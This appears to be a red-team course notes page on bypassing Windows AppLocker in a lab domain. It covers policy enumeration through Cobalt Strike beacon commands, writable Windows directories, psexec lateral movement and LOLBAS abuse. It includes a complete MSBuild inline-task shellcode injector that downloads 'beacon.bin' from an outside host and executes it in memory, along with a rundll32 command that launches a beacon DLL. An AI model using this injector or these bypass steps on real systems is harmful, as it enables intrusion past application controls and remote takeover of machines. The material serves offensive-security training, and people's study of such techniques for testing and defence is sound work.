---
description: 11/12/2025
---

# ✅ Application Whitelisting

## AppLocker

[AppLocker](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/applocker-overview) is an application whitelisting technology that is built into the Windows Operating System.

### Purpose

The purpose is to restrict applications and scripts that are allowed to run on a machine, defined through a set of policies which are pushed via GPO.

Rules can be based on file attributions such as publisher, name, version, hash, or path.

* They can be set to _**allow**_ or _**deny**_ and can assigned on an individual user or group basis

AppLocker will also change the PowerShell [Language Mode](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes) from `FullLanguage` to `ConstrainedLanguage`. &#x20;

This restricts the .NET types that can be used, preventing `Add-Type` with any arbitrary C# as well as `New-Object` on types that are not specifically permitted.

### Defences

As a defence, AppLocker is only as good as the defined ruleset.

Microsoft comes shipped with default rules, which are very broad and allow all executables and scripts located in the `Program Files` and Windows directories.&#x20;

## Policy Enumeration

In the practice lab environment, AppLocker is applied to `dc.dev-studio.com`.

### Reading the Policy

The policy can be read from two places - directly from the GPO or from the local registry of a machine they're applied to.&#x20;

Reading from the GPO is the same process as with LAPS - find the GPO, download the `Registry.pol` file from the `gpcfilesyspath` and parse with `Parse-PolFile`.

```
beacon> powershell Get-DomainGPO -Domain dev-studio.com | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath

displayname gpcfilesyspath                                                                        
----------- --------------                                                                        
AppLocker   \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}

beacon> download \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol
[*] started download of \\dev-studio.com\SysVol\dev-studio.com\Policies\{7E1E1636-1A59-4C35-895B-3AEB1CA8CFC2}\Machine\Registry.pol (7616 bytes)
[*] download of Registry.pol is complete
```

There's an example of one of the executable rules, contained in the ValueData field.

```
KeyName     : Software\Policies\Microsoft\Windows\SrpV2\Exe\a61c8b2c-a319-4cd0-9690-d2177cad7b51
ValueName   : Value
ValueType   : REG_SZ
ValueLength : 700
ValueData   : <FilePathRule Id="a61c8b2c-a319-4cd0-9690-d2177cad7b51" Name="(Default Rule) All files located in the
              Windows folder" Description="Allows members of the Everyone group to run applications that are located
              in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition
              Path="%WINDIR%\*"/></Conditions></FilePathRule>
```

They're fairly self-explanatory - this rule will allow everybody to run executables that are located within the Windows directory. &#x20;

If on a local machine, you can query the registry at `HKLM:Software\Policies\Microsoft\Windows\SrpV2` to obtain the same.

```
PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"

    Hive: HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2

Name                           Property
----                           --------
Appx                           EnforcementMode : 1
                               AllowWindows    : 0
Dll                            AllowWindows : 0
Exe                            EnforcementMode : 1
                               AllowWindows    : 0
Msi                            EnforcementMode : 1
                               AllowWindows    : 0
Script                         EnforcementMode : 1
                               AllowWindows    : 0
```

* Note that DLL rules are not enforced. &#x20;

This is commonly the case because Microsoft say it can impact system performance.

```
PS C:\Users\Administrator> Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe"

    Hive: HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\SrpV2\Exe

Name                           Property
----                           --------
921cc481-6e17-4653-8f75-050b80 Value : <FilePathRule Id="921cc481-6e17-4653-8f75-050b80acca20" Name="(Default Rule) All files located in the Program Files folder" Description="Allows
acca20                         members of the Everyone group to
                                       run applications that are located in the Program Files folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition
                                       Path="%PROGRAMFILES%\*"/></Conditions></FilePathRule>
a61c8b2c-a319-4cd0-9690-d2177c Value : <FilePathRule Id="a61c8b2c-a319-4cd0-9690-d2177cad7b51" Name="(Default Rule) All files located in the Windows folder" Description="Allows members
ad7b51                         of the Everyone group to run
                                       applications that are located in the Windows folder." UserOrGroupSid="S-1-1-0" Action="Allow"><Conditions><FilePathCondition
                               Path="%WINDIR%\*"/></Conditions></FilePathRule>
```

The `Get-ChildItem` cmdlet is permitted under CLM.

```
PS C:\Users\Administrator> $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
```

## Writeable Paths

The default rules allow execution from anywhere within `C:\Program Files and C:\Windows` (including subdirectories). &#x20;

Moving laterally to a protected machine via `psexec` is trivial, because the service executable is written into `C:\Windows`.

```
beacon> jump psexec64 dc.dev-studio.com smb
Started service b8f5313 on dc.dev-studio.com
[+] established link to child beacon: 10.10.150.10
```

If you're on a protected machine as a standard user, there are several directories within `C:\Windows` that are writeable. &#x20;

One such example is `C:\Windows\Tasks`. &#x20;

**This would allow us to copy an executable into this directory and run it:**

```
beacon> powershell Get-Acl C:\Windows\Tasks | fl

Path   : Microsoft.PowerShell.Core\FileSystem::C:\Windows\Tasks
Owner  : NT AUTHORITY\SYSTEM
Group  : NT AUTHORITY\SYSTEM
Access : CREATOR OWNER Allow  268435456
         NT AUTHORITY\Authenticated Users Allow  CreateFiles, ReadAndExecute, Synchronize    <---
         NT AUTHORITY\SYSTEM Allow  268435456
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  268435456
         BUILTIN\Administrators Allow  FullControl
Audit  : 
Sddl   : O:SYG:SYD:PAI(A;OICIIO;GA;;;CO)(A;;0x1200ab;;;AU)(A;OICIIO;GA;;;SY)(A;;FA;;;SY)(A;OICIIO;GA;;;BA)(A;;FA;;;BA)
```

When enumerating the rules, you may also find additional weak rules that system administrators have put in. &#x20;

**This is an example of a rule I've genuinely seen in production:**

```
<FilePathCondition Path="*\AppV\*"/>
```

## Living Off The Land Binaries (LOLBAS), Scripts & Bins

Known colloquially as <mark style="color:yellow;">LOLBAS</mark>, <mark style="color:$danger;">these are executables and scripts that come as part of Windows but allow for arbitrary code execution</mark>. &#x20;

They <mark style="color:green;">allow us to bypass AppLocker</mark>, because they're allowed to execute under the normal allow criteria - they exist in trusted paths (`C:\Windows and C:\Program Files`) and may also be digitally signed by Microsoft.

_**The**_ [_**LOLBAS website**_](https://lolbas-project.github.io/) _**contains hundreds of examples that can be utilised.**_ &#x20;

Let's use [MSBuild](https://lolbas-project.github.io/lolbas/Binaries/Msbuild/) as a demo - if not blocked, it can be used to execute arbitrary C# code from a `.csproj` or `.xml` file.

```csharp
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest : Task, ITask
            {
                public override bool Execute()
                {
                    Console.WriteLine("Hello World");
                    return true;
                }
            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

<figure><img src="../.gitbook/assets/image (11) (1) (1).png" alt=""><figcaption></figcaption></figure>

This could be turned into a basic shellcode injector.

```csharp
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://nickelviper.com";
                        shellcode = client.DownloadData("beacon.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

{% hint style="info" %}
You can use `http_x64.xprocess.bin` here and host it on the Cobalt Strike Team Server via _Site Management > Host File_.
{% endhint %}

<figure><img src="../.gitbook/assets/image (12) (1) (1).png" alt=""><figcaption></figcaption></figure>

## PowerShell CLM

As previously mentioned, DLL enforcement is typically not enabled which allows us to call exported functions from DLLs on disk via `rundll32`.

Beacon's DLL payload exposes several important exports including `DllMain` and `StartW`.

These can be changed in the Artifact Kit under `src-main`, `dllmain.def`.

```
C:\Windows\System32\rundll32.exe http_x64.dll,StartW
```
